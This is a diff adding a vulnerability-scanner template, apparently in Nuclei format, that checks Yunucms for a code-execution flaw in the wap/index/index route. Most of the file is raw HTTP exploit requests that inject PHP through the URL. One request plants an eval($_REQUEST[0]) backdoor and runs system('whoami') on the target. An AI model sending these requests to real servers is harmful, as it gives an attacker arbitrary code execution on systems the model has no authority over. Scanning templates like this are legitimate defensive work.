@@ -1,0 +1,42 @@
+id: yunucms-request-uri-code-execution
+info:
+  name: Yunucms Request URI Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yunucms versions v1 to 2.0.5 have a code execution vulnerability in the request_uri parameter of the front-end wap/index/index method. Attackers can exploit this vulnerability to execute arbitrary code on the server.
+  reference:
+    - https://www.qshu1.com/2022/09/17/yunucms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%91/ 代码注入部分
+  tags: code-execution
+  classification:
+    cvss-score: 10.0
+http:
+  - raw:
+      - |
+        GET /index.php?s=wap/index/index&asdasd=aa";print_r(md5(123));exit;?> HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+        part: body
+  - raw:
+      - |
+        POST /index.php?s=wap/index/index&asdasd=aa";print_r(md5(123));eval($_REQUEST[0]);print_r(md5(123));exit;?> HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        0=system('whoami');
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+        part: body
